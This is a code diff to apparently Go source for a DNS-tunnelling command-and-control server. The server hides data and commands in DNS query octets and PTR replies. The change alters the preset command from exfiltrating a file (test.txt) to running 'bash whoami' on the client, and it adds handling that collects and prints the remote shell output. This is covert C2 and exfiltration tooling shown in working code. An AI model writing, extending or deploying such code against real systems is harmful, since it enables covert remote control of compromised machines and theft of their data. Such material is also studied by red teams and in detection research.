@@ -21,8 +21,8 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 	var c2_command string = ""
 
 	// Specify what the client should do on the next connection to this server
-	// This example specifies that the client should exfiltrate (exf) the file test.txt to the server.
-	c2_mappings := map[string]string{"hbt": "cmd-exfil-single.test.txt"}
+	// Ex:	cmd.exfil-single.test.txt specifies that the client should exfiltrate (exf) the file test.txt to the server.
+	c2_mappings := map[string]string{"hbt": "cmd.bash.whoami"}
 
 	// If the first octet is equal to "172" or "185", the operation is setting the mode and current baseline. Otherwise, decode the data using the baseline.
 	if octets[0] == "172" || octets[0] == "185" {
@@ -67,23 +67,19 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 		} else { // If the current mode is C2 communication, interpret the bytes as a command.
 			command := string(bytes[:])
 
-			if *c && command != "els" && command != "bls" {
+			if *c && command != "fin" && command != "beg" {
 				// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
 				*lsb = append((*lsb), []byte(command)...)
-			} else {
-				if command != "bls" && command != "els" {
-					fmt.Printf("Command: %v\n", command)
-				}
 			}
 
-			if command == "bls" { // Begin collecting the output bytes of the ls command
+			switch command {
+			case "beg": // Begin collecting the output bytes of the bash command
 				*c = true
-			} else if command == "els" { // Finish collecting the output bytes of the ls command, and output the gathered data.
-				fmt.Println("Output of 'ls':")
-				fmt.Printf("%v", string(*lsb))
+			case "fin": // Finish collecting the output bytes of the bash command, and output the gathered data.
+				fmt.Printf("~$ %v", string(*lsb))
 				*lsb = []byte{}
 				*c = false
-			} else { // Otherwise, return the c2 command outlined in the c2_mappings map.
+			default: // Otherwise, return the c2 command outlined in the c2_mappings map.
 				c2_command = c2_mappings[command]
 			}
 		}
@@ -122,6 +118,7 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 	if val != "" {
 		word = val
 	}
+
 	// Send a PTR response back to the client.
 	m := new(dns.Msg)
 	m.SetReply(r)
